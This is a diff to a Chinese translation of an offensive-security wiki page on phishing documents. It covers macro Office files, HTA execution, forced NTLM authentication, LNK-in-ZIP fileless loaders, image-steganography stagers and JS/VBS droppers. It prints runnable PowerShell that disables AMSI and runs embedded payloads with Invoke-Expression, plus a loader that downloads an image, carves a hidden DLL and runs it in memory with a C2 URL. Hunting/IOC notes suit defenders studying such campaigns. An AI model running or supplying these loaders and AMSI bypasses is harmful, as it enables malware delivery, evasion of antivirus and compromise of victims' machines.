@@ -1,16 +1,16 @@
-# 钓鱼文件与文档
+# Phishing 文件与文档
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Office 文档
 
-Microsoft Word 在打开文件之前会进行文件数据验证。数据验证以数据结构识别的形式，根据 OfficeOpenXML standard 进行。如果在数据结构识别过程中发生任何错误，正在分析的文件将不会被打开。
+Microsoft Word 在打开文件之前会执行文件数据验证。数据验证以数据结构识别的形式进行，基于 OfficeOpenXML 标准。如果在数据结构识别期间发生任何错误，正在分析的文件将不会被打开。
 
-通常，包含宏的 Word 文件使用 `.docm` 扩展名。但是，可以通过更改文件扩展名来重命名文件，同时仍保留其宏执行能力。\
-例如，RTF 文件按设计不支持宏，但如果将 DOCM 文件重命名为 RTF，Microsoft Word 仍会处理该文件并能够执行宏。\
+通常，包含宏的 Word 文件使用 `.docm` 扩展名。然而，可以通过更改文件扩展名来重命名文件，同时仍保留其宏执行功能。\
+例如，RTF 文件按设计不支持宏，但将 DOCM 文件重命名为 RTF 后，Microsoft Word 仍会处理该文件，并且能够执行宏。\
 相同的内部机制适用于 Microsoft Office Suite 的所有软件（Excel、PowerPoint 等）。
 
-你可以使用以下命令来检查某些 Office 程序将会执行哪些扩展名：
+您可以使用以下命令来检查某些 Office 程序将执行哪些扩展名：
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
@@ -18,8 +18,8 @@ DOCX files referencing a remote template (File –Options –Add-ins –Manage: 
 
 ### 外部图片加载
 
-转到： _Insert --> Quick Parts --> Field_\
-_**Categories**: 链接和引用, **字段名称**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
+Go to: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
@@ -29,7 +29,7 @@ _**Categories**: 链接和引用, **字段名称**: includePicture, and **Filena
 
 #### 自动加载函数
 
-它们越常见，被 AV 检测到的概率就越高。
+它们越常见，AV 越可能检测到它们。
 
 - AutoOpen()
 - Document_Open()
@@ -66,14 +66,14 @@ proc.Create "powershell <beacon line generated>
 ```
 #### 手动删除元数据
 
-转到 **File > Info > Inspect Document > Inspect Document**，这会打开 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁点击 **Remove All**。
+转到 **File > Info > Inspect Document > Inspect Document**，这将调出 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁点击 **Remove All**。
 
-#### 文档扩展名
+#### Doc Extension
 
-完成后，从 **Save as type** 下拉菜单中选择，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\
-这样做是因为你 **can't save macro's inside a `.docx`**，并且对启用宏的 **`.docm`** 扩展存在一种 **污名**（例如缩略图图标有一个巨大的 `!`，一些网络/邮件网关会完全阻止它们）。因此，这种 **传统的 `.doc` 扩展是最佳折衷**。
+完成后，选择 **Save as type** 下拉菜单，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\
+这样做是因为你 **无法在 `.docx` 中保存 macro**，并且围绕宏启用的 **`.docm`** 扩展名存在一定的 **污名**（例如缩略图图标有一个巨大的 `!`，一些 web/email gateway 会完全阻止它们）。因此，**传统 `.doc` 扩展名 是最佳折衷**。
 
-#### 恶意宏生成器
+#### Malicious Macros Generators
 
 - MacOS
 - [**macphish**](https://github.com/cldrn/macphish)
@@ -81,9 +81,9 @@ proc.Create "powershell <beacon line generated>
 
 ## HTA Files
 
-An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
+An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**。它生成用户界面并作为一个“完全受信任”的应用程序执行，不受浏览器安全模型的限制。
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
+An HTA is executed using **`mshta.exe`**，`mshta.exe` 通常随 **Internet Explorer** 一起 **已安装**，这使得 **`mshta` 依赖于 IE**。因此，如果它已被卸载，HTA 将无法执行。
 ```html
 <--! Basic HTA Execution -->
 <html>
@@ -140,9 +140,9 @@ self.close
 ```
 ## 强制 NTLM 身份验证
 
-有几种方法可以**“远程”强制 NTLM 身份验证**，例如，你可以在用户会访问的电子邮件或 HTML 中添加**不可见图像**（甚至 HTTP MitM？）。或者向受害者发送会在**打开文件夹时**触发**身份验证**的**文件地址**。
+有多种方法可以**“远程”强制 NTLM 身份验证**，例如，你可以在用户会访问的电子邮件或 HTML 中添加**隐形图片**（甚至通过 HTTP MitM？）。或者发送给受害者某些文件的**地址**，仅打开该文件夹就会**触发**一次**认证**。
 
-**在以下页面查看这些想法及更多内容：**
+**在下列页面查看这些思路及更多内容：**
 
 
 {{#ref}}
@@ -156,24 +156,24 @@ self.close
 
 ### NTLM Relay
 
-别忘了，你不仅可以窃取 hash 或 authentication，还可以 **perform NTLM relay attacks**：
+别忘了，你不仅可以窃取哈希或认证，而且还可以**perform NTLM relay attacks**：
 
 - [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 ## LNK Loaders + ZIP-Embedded Payloads (fileless chain)
 
-高效的活动会投递一个 ZIP，包含两个合法的诱饵文档 (PDF/DOCX) 和一个恶意 .lnk。诀窍是实际的 PowerShell loader 存放在 ZIP 的原始字节里，在一个唯一的标记之后，.lnk 会将其提取并在内存中完全运行。
+高效的攻击活动通常会投递一个 ZIP，内含两个合法的诱饵文档 (PDF/DOCX) 和一个恶意 .lnk。关键在于真正的 PowerShell loader 存储于 ZIP 的原始字节中、在一个唯一标记之后，而 .lnk 会从中提取并在内存中完全运行它。
 
-典型流程由 .lnk PowerShell one-liner 实现：
+典型的流程由 .lnk 的 PowerShell 一行命令实现：
 
-1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData%，以及当前工作目录的父目录。
-2) 读取 ZIP 字节并查找硬编码的标记（例如 xFIQCV）。标记之后的所有内容都是嵌入的 PowerShell payload。
-3) 将 ZIP 复制到 %ProgramData%，在那解压，并打开诱饵 .docx 以伪装为合法文件。
-4) 为当前进程绕过 AMSI： [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
-5) 对下一阶段进行反混淆（例如，移除所有 # 字符），并在内存中执行。
+1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData%，以及当前工作目录的父目录。  
+2) 读取 ZIP 字节并查找硬编码标记（例如 xFIQCV）。标记之后的全部内容就是嵌入的 PowerShell payload。  
+3) 将 ZIP 复制到 %ProgramData%、在那里解压，并打开诱饵 .docx 以显得合法。  
+4) 绕过当前进程的 AMSI： [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
+5) 对下一阶段进行反混淆（例如，移除所有 # 字符），并在内存中执行它。
 
-示例 PowerShell 骨架，用于提取并运行嵌入的阶段：
+下面是用于提取并运行嵌入阶段的示例 PowerShell 骨架：
 ```powershell
 $marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
 $paths    = @(
@@ -190,18 +190,18 @@ $code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 Invoke-Expression $code
 ```
-Notes
+注意
 - Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
 - The next stage frequently decrypts base64/XOR shellcode and executes it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.
 
-Persistence used in the same chain
+同一链中使用的持久化
 - COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:
 
 {{#ref}}
 ../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
 {{#endref}}
 
-Hunting/IOCs
+威胁狩猎/IOCs
 - ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.
 - .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.
 - AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
@@ -209,9 +209,9 @@ Hunting/IOCs
 
 ## Steganography-delimited payloads in images (PowerShell stager)
 
-近期的 loader 链会投递混淆过的 JavaScript/VBS，解码并运行一个 Base64 PowerShell stager。该 stager 下载一张图片（常为 GIF），图片在独特的起止标记之间以明文形式包含了 Base64 编码的 .NET DLL。脚本搜索这些分隔符（野外观测到的示例： «<<sudo_png>> … <<sudo_odt>>>»），提取中间文本，进行 Base64 解码为字节，在内存中加载该 assembly 并调用已知入口方法，传入 C2 URL。
+近期的 loader chain 会投递一个混淆的 JavaScript/VBS，解码并运行一个 Base64 PowerShell stager。该 stager 下载一张图像（常为 GIF），图像中在唯一的起/止标记之间以纯文本形式隐藏了一个 Base64 编码的 .NET DLL。脚本搜索这些分隔符（实战中见到的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取中间文本，Base64 解码为字节，在内存中加载 assembly 并调用已知入口方法，同时传入 C2 URL。
 
-Workflow
+工作流程
 - Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell stager with -nop -w hidden -ep bypass.
 - Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64, loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.
 - Stage 3: Loader retrieves final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about process hollowing and trusted utility proxy execution here:
@@ -223,7 +223,7 @@ Workflow
 PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:
 
 <details>
-<summary>PowerShell 隐写负载提取器和加载器</summary>
+<summary>PowerShell stego payload extractor and loader</summary>
 ```powershell
 # Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
 param(
@@ -247,12 +247,12 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 ```
 </details>
 
-说明
-- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
-- AMSI/ETW bypass and string deobfuscation are commonly applied before loading the assembly.
-- 检测：扫描下载的图像以查找已知分隔符；识别访问图像并立即解码 Base64 blobs 的 PowerShell。
+备注
+- This is ATT&CK T1027.003 (steganography/marker-hiding). 标记在不同活动中各不相同。
+- AMSI/ETW bypass and string deobfuscation 通常在加载程序集之前应用。
+- 威胁狩猎：扫描下载的图像以查找已知分隔符；识别访问图像并立即解码 Base64 blobs 的 PowerShell。
 
-另见 stego tools 和 carving techniques：
+另见 stego 工具和 carving 技术：
 
 {{#ref}}
 ../../crypto-and-stego/stego-tricks.md
@@ -260,28 +260,28 @@ $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
 
 ## JS/VBS droppers → Base64 PowerShell staging
 
-经常出现的初始阶段是一个小的、经过强烈混淆的 `.js` 或 `.vbs`，随归档一起交付。其唯一目的是解码一个嵌入的 Base64 字符串并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，以便通过 HTTPS 引导下一阶段。
+一个常见的初始阶段是一个小型、高度混淆的 `.js` 或 `.vbs`，随归档投递。其唯一目的为解码嵌入的 Base64 字符串并使用 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导下一个阶段。
 
 骨架逻辑（抽象）：
 - 读取自身文件内容
 - 在垃圾字符串之间定位 Base64 blob
 - 解码为 ASCII PowerShell
-- 通过 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行
+- 使用 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行
 
 检测线索
-- 归档的 JS/VBS 附件在命令行中包含 `-enc`/`FromBase64String` 并生成 `powershell.exe`。
-- 从用户临时路径使用 `wscript.exe` 启动 `powershell.exe -nop -w hidden`。
+- 归档的 JS/VBS 附件在命令行中生成 `powershell.exe` 并带有 `-enc`/`FromBase64String`。
+- `wscript.exe` 从用户临时目录启动 `powershell.exe -nop -w hidden`。
 
-## Windows 文件以窃取 NTLM 哈希
+## Windows 文件用于窃取 NTLM 哈希
 
-查看关于 **places to steal NTLM creds** 的页面：
+查看有关 **places to steal NTLM creds** 的页面：
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
 
-## 参考
+## References
 
 - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
